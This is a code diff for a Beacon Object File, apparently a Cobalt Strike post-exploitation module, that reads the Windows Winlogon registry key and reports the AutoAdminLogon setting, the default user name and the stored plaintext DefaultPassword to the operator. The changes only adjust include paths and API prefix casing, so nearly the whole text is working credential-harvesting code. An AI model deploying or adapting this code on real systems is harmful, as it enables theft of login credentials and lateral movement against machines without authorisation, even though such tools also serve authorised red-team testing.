@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <stdbool.h>
-#include "../_include/beacon.h"
-#include "../_include/bofdefs.h"
+#include "beacon.h"
+#include "bofdefs.h"
 
 void go() {
     HKEY hKey;
@@ -9,8 +9,8 @@ void go() {
     char szValue[256] = { 0 };
     DWORD dwSize = sizeof(szValue);
 
-    if (Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        if (Advapi32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
+    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (ADVAPI32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: %s\n", szValue);
         } else {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: Not Found\n");
@@ -18,7 +18,7 @@ void go() {
 
         // Reset value of dwSize
         dwSize = sizeof(szValue);
-        if (Advapi32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
+        if (ADVAPI32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: %s\n", szValue);
         } else {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: Not Found\n");
@@ -26,13 +26,13 @@ void go() {
 
         // Reset value of dwSize
         dwSize = sizeof(szValue);
-        if (Advapi32$RegQueryValueExA(hKey, "DefaultPassword", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
+        if (ADVAPI32$RegQueryValueExA(hKey, "DefaultPassword", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: %s\n", szValue);
         } else {
             BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: Not Found\n");
         }
 
-        Advapi32$RegCloseKey(hKey);
+        ADVAPI32$RegCloseKey(hKey);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] No Autologon Registry Key Found.\n");
     }
